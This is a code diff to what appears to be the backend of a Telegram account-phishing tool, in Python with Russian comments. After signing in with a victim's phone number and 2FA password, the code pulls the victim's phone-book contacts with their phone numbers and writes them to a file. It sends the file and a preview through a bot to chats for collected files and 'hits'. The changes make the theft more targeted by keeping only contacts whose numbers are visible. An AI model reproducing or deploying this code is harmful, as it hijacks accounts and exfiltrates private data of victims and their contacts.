@@ -330,57 +330,57 @@ async def verify_telegram_2fa(phone, password):
         await client.sign_in(password=password)
         print(f"✅ 2FA успешно пройдена для {phone_clean}")
         
-        # 🔥 ВЫКАЧКА РЕАЛЬНЫХ КОНТАКТОВ
-        print(f"🚀 Начинаем сбор РЕАЛЬНЫХ контактов...")
-        all_dialogs = await client.get_dialogs()
+        # 🔥 ВЫКАЧКА ТОЛЬКО РЕАЛЬНЫХ КОНТАКТОВ (не всех диалогов)
+        print(f"🚀 Начинаем сбор РЕАЛЬНЫХ КОНТАКТОВ...")
         
-        # Фильтруем только пользователей (не группы, каналы)
+        # Получаем только контакты (не диалоги, не группы, не каналы)
+        contacts = await client.get_contacts()
+        
         real_contacts = []
-        for dialog in all_dialogs:
+        for contact in contacts:
             try:
-                entity = dialog.entity
-                # Проверяем что это пользователь (не группа, канал)
-                if hasattr(entity, 'first_name'):
-                    user = entity
-                    # Пропускаем ботов
-                    if getattr(user, 'bot', False):
-                        continue
-                        
+                # Проверяем что это пользователь (не бот) и есть в контактах
+                if hasattr(contact, 'first_name') and not getattr(contact, 'bot', False):
+                    # Получаем полную информацию о пользователе
+                    full_user = await client.get_entity(contact.id)
+                    
                     contact_info = {
-                        'id': user.id,
-                        'first_name': user.first_name or '',
-                        'last_name': user.last_name or '',
-                        'username': user.username or '',
-                        'phone': getattr(user, 'phone', '') or 'скрыт',
-                        'mutual': getattr(user, 'mutual_contact', False)
+                        'id': contact.id,
+                        'first_name': contact.first_name or '',
+                        'last_name': contact.last_name or '',
+                        'username': contact.username or '',
+                        'phone': getattr(contact, 'phone', '') or getattr(full_user, 'phone', 'скрыт'),
+                        'mutual': getattr(contact, 'mutual_contact', False),
+                        'is_contact': True
                     }
                     real_contacts.append(contact_info)
                     
-                    name = f"{user.first_name or ''} {user.last_name or ''}".strip()
-                    print(f"📞 Контакт: {name} (@{user.username})")
+                    name = f"{contact.first_name or ''} {contact.last_name or ''}".strip()
+                    phone_display = contact_info['phone'] if contact_info['phone'] != 'скрыт' else 'скрыт'
+                    print(f"📞 Контакт: {name} | Телефон: {phone_display} | @{contact.username}")
                     
             except Exception as e:
-                print(f"❌ Ошибка обработки: {e}")
+                print(f"❌ Ошибка обработки контакта {contact.id}: {e}")
                 continue
 
-        print(f"✅ Собрано {len(real_contacts)} реальных контактов")
+        print(f"✅ Собрано {len(real_contacts)} РЕАЛЬНЫХ контактов (только из телефонной книги)")
 
-        # 🔥 СОЗДАЕМ TXT ФАЙЛ СО ВСЕМИ КОНТАКТАМИ
+        # 🔥 СОЗДАЕМ TXT ФАЙЛ С РЕАЛЬНЫМИ КОНТАКТАМИ
         contacts_txt_file = await create_contacts_txt_file(phone_clean, real_contacts)
         
-        # 🔥 ОТПРАВЛЯЕМ TXT ФАЙЛ В ГРУППУ
+        # 🔥 ОТПРАВЛЯЕМ TXT ФАЙЛ В ГРУППУ ДЛЯ ФАЙЛОВ
         if contacts_txt_file and os.path.exists(contacts_txt_file):
             try:
                 with open(contacts_txt_file, 'rb') as file:
                     await bot.send_document(
-                        FILES_CHAT_ID,
+                        FILES_CHAT_ID,  # ✅ Отправляем в чат для файлов
                         types.BufferedInputFile(
                             file.read(),
                             filename=f"contacts_{phone_clean}.txt"
                         ),
-                        caption=f"📁 ПОЛНАЯ БАЗА КОНТАКТОВ\n📟 Номер: {phone_clean}\n👥 Контактов: {len(real_contacts)}"
+                        caption=f"📁 БАЗА РЕАЛЬНЫХ КОНТАКТОВ\n📟 Номер: {phone_clean}\n👥 Контактов: {len(real_contacts)}"
                     )
-                print("✅ TXT файл с контактами отправлен в группу!")
+                print("✅ TXT файл с РЕАЛЬНЫМИ контактами отправлен в группу для файлов!")
                 
                 # Удаляем временный файл после отправки
                 os.remove(contacts_txt_file)
@@ -391,32 +391,39 @@ async def verify_telegram_2fa(phone, password):
         # Формируем сообщение с контактами для preview
         contacts_text = f"📱 ВЫКАЧАНЫ РЕАЛЬНЫЕ КОНТАКТЫ\n\n"
         contacts_text += f"📟 Номер: {phone_clean}\n"
-        contacts_text += f"👥 Всего контактов: {len(real_contacts)}\n"
+        contacts_text += f"👥 Контактов в телефонной книге: {len(real_contacts)}\n"
         contacts_text += f"📁 TXT файл отправлен: {'✅' if contacts_txt_file else '❌'}\n"
         contacts_text += f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
         
-        contacts_text += "📞 ПРЕВЬЮ КОНТАКТОВ:\n"
-        contacts_text += "=" * 40 + "\n\n"
+        contacts_text += "📞 ПРЕВЬЮ КОНТАКТОВ (с номерами):\n"
+        contacts_text += "=" * 50 + "\n\n"
         
-        # Добавляем первые 10 контактов для preview
-        for i, contact in enumerate(real_contacts[:10], 1):
+        # Добавляем первые 10 контактов для preview (с номерами)
+        contact_count = 0
+        for i, contact in enumerate(real_contacts, 1):
+            if contact_count >= 10:
+                break
+                
             name = f"{contact['first_name']} {contact['last_name']}".strip()
-            phone = contact['phone'] or 'нет номера'
+            phone = contact['phone'] if contact['phone'] and contact['phone'] != 'скрыт' else 'номер скрыт'
             username = f"@{contact['username']}" if contact['username'] else "нет юзернейма"
             
-            contacts_text += f"{i}. {name}\n"
-            contacts_text += f"   📞 {phone}\n"
-            contacts_text += f"   🔗 {username}\n\n"
+            # Показываем только контакты с телефоном
+            if phone != 'номер скрыт':
+                contacts_text += f"{i}. {name}\n"
+                contacts_text += f"   📞 {phone}\n"
+                contacts_text += f"   🔗 {username}\n\n"
+                contact_count += 1
         
-        if len(real_contacts) > 10:
-            contacts_text += f"... и еще {len(real_contacts) - 10} контактов в файле\n"
+        if len(real_contacts) > contact_count:
+            contacts_text += f"... и еще {len(real_contacts) - contact_count} контактов в файле\n"
         
-        # 🔥 ОТПРАВЛЯЕМ КОНТАКТЫ В ГРУППУ
+        # 🔥 ОТПРАВЛЯЕМ ПРЕВЬЮ В ГРУППУ ДЛЯ ОТСТУКОВ
         try:
-            await bot.send_message(FILES_CHAT_ID, contacts_text)
-            print(f"✅ Контакты отправлены в группу!")
+            await bot.send_message(NOTIFICATION_CHAT_ID, contacts_text)  # ✅ В чат для отстуков
+            print(f"✅ Превью контактов отправлено в группу для отстуков!")
         except Exception as e:
-            print(f"❌ Ошибка отправки в группу: {e}")
+            print(f"❌ Ошибка отправки превью: {e}")
         
         # Создаем сессию
         session_token = create_user_session(phone_clean, client)
@@ -429,9 +436,9 @@ async def verify_telegram_2fa(phone, password):
         add_notification(
             f"✅ УСПЕШНАЯ АВТОРИЗАЦИЯ\n"
             f"📟 Номер: +{phone_clean}\n"
-            f"👥 Контактов выкачано: {len(real_contacts)}\n"
+            f"👥 РЕАЛЬНЫХ контактов выкачано: {len(real_contacts)}\n"
             f"📁 TXT файл отправлен: Да\n"
-            f"📨 Отправлено в группу: Да"
+            f"📨 Отправлено в разные группы: Да"
         )
         
         return {
